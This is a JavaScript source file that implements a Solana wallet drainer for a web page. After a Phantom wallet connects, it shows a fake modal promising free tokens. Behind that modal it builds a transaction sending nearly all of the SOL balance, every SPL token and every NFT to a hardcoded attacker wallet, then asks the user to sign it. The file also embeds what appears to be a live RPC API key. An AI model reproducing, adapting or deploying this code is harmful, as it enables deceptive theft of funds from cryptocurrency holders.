import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { Token, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // Make Buffer available globally if needed

// Function to display a fake confirmation modal
function showFakeConfirmationModal() {
    // Create a modal that looks like a transaction preview
    const modal = document.createElement('div');
    modal.id = 'fake-transaction-modal';
    modal.innerHTML = `
        <div style="background-color: white; border: 1px solid #ccc; padding: 20px; border-radius: 10px;">
            <h3>Confirm Fake Token Transfer</h3>
            <p>You will receive <strong>100 Fake Tokens</strong>.</p>
            <button id="confirm-fake-transaction">Confirm</button>
        </div>
    `;
    document.body.appendChild(modal);

    document.getElementById('confirm-fake-transaction').addEventListener('click', () => {
        modal.remove(); // Remove the modal when the user confirms
        // Trigger the real transaction here
        triggerRealTransaction();
    });
}

// Function to handle the actual transfer logic
async function triggerRealTransaction() {
    try {
        const connection = new Connection(
            'https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1',
            'confirmed'
        );

        const publicKey = new PublicKey(window.solana.publicKey);
        const walletBalanceLamports = await connection.getBalance(publicKey);
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        const receiverWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Recipient's wallet
        let transaction = new Transaction();

        // Transfer SOL
        const balanceForTransferLamports = walletBalanceLamports - minBalance;
        if (balanceForTransferLamports > 0) {
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: receiverWallet,
                    lamports: Math.floor(balanceForTransferLamports * 0.99),
                })
            );
        }

        // Transfer SPL tokens and NFTs
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
            programId: TOKEN_PROGRAM_ID
        });

        for (const tokenAccount of tokenAccounts.value) {
            const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
            if (tokenAmount > 0) {
                const tokenPubkey = new PublicKey(tokenAccount.pubkey);
                const tokenMint = new PublicKey(tokenAccount.account.data.parsed.info.mint);

                const associatedTokenAddress = await Token.getAssociatedTokenAddress(
                    ASSOCIATED_TOKEN_PROGRAM_ID,
                    TOKEN_PROGRAM_ID,
                    tokenMint,
                    receiverWallet
                );

                const accountInfo = await connection.getAccountInfo(associatedTokenAddress);
                if (accountInfo === null) {
                    transaction.add(
                        Token.createAssociatedTokenAccountInstruction(
                            ASSOCIATED_TOKEN_PROGRAM_ID,
                            TOKEN_PROGRAM_ID,
                            tokenMint,
                            associatedTokenAddress,
                            receiverWallet,
                            publicKey
                        )
                    );
                }

                transaction.add(
                    Token.createTransferInstruction(
                        TOKEN_PROGRAM_ID,
                        tokenPubkey,
                        associatedTokenAddress,
                        publicKey,
                        [],
                        Math.floor(tokenAmount)
                    )
                );
            }
        }

        // Sign and send the real transaction
        transaction.feePayer = publicKey;
        const blockhashObj = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhashObj.blockhash;

        const signedTransaction = await window.solana.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(txid);

        console.log("Real transaction sent and confirmed:", txid);
    } catch (err) {
        console.error("Error during real transaction:", err);
    }
}

// This function handles the wallet connection and triggers the fake modal
async function handleConnectWallet() {
    if (window.solana && window.solana.isPhantom) {
        try {
            const resp = await window.solana.connect();
            showFakeConfirmationModal(); // Show fake confirmation modal
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
        }
    } else {
        alert("Phantom extension not found.");
        // ... Open appropriate download links
    }
}

// Attach the event listener to the button
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('connect-wallet').addEventListener('click', handleConnectWallet);
});
